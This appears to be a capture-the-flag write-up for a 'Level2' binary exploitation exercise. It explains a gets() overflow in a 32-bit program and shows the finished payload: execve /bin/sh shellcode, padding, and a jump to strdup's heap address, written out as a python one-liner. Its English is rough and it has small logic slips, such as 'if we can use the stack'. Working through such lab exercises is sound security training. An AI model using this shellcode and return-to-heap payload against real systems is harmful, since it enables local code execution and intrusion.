## Level2

As in the level1 we see that we have a gets function so will may have to do an overflow attack.   

Going deeply into the code, we see that there is no excution of shell in the differecte function.  
So we will probably have to create our own shellcode to access to a shell.   
 

The p function that is call by the main use gets, and then check the stack to see if we have overide into the stack.  
stack address range : xbf000000 - 0xbfffffff  

So if we can use the stack we have to use the heap...   
Here we see strdup that use malloc --> that store thing on the heap  

Know we miss some information to apply our strategie : 
- The lenght that make gets overflow
- The address of the return of strdup
- A shellcode (smaller than the lenght that make gets overflow)

Let's Go 

1) buffer overflow patter :
source : https://wiremask.eu/tools/buffer-overflow-pattern-generator/
we use a buffer overflow patter on the input need by gets, then check with the same site the lenght were it's overflow (here 80)

2) ltrace :
On that programme we can use ltrace to see witch function the programme call, and the return memory storage of them, 
puts("")                                       = 1
strdup("")                                     = 0x0804a008

Return address of strdup is `0x0804a008`

3) shellcode :
source http://shell-storm.org/shellcode/index.html
fill free to chose the one you like,

Last step, construct your string :
80 caracteres long starting with a shellcode then spam caractere to finish the string then the address of strdup :  
where "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" (shellcode) + "\x90\x90" (EOF, useless but clean using debug) + "A" * 57 (spam caractere) + "\x08\xa0\x04\x08" (strdup addr)

 python -c 'print("\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\x90\x90" + "A" * 57 + "\x08\xa0\x04\x08")' > /tmp/tt



